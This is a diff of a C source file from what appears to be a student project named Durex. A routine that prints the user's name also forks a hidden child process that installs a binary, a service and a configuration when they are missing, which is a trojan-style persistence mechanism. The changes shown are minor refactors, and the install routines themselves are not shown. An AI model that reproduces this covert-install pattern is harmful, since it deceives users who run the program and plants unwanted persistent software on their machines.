@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2018/08/21 06:09:45 by root             ###   ########.fr       */
+/*   Updated: 2018/08/29 12:06:56 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,13 +15,12 @@
 /* getpwuid */
 #include <sys/types.h>
 #include <pwd.h>
-
+ #include <stdio.h>
 #include "main.h"
 
-static void			print_usr_name()
+void				print_usr_name()
 {
 	struct passwd	*passwd;
-	pid_t			pid;
 	int				fd;
 
 	passwd = getpwuid(getuid());
@@ -29,11 +28,9 @@ static void			print_usr_name()
 	write(STDIN_FILENO, "\n", 1);
 	if (seteuid(geteuid()) != 0)
 		return ;
-	fd = open(DUREX_BINARY_FILE, O_RDONLY);
+	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
 	if (fd < 0) {
-		close(fd);
-		pid = fork();
-		if (pid == 0) {
+		if (fork() == 0) {
 			int		(*process[])(void) = { &install_binary,
 										   &install_service,
 										   &install_conf,
@@ -46,6 +43,7 @@ static void			print_usr_name()
 			exit(0);
 		}
 	}
+	close(fd);
 }
 
 int					main(int ac, char **av)
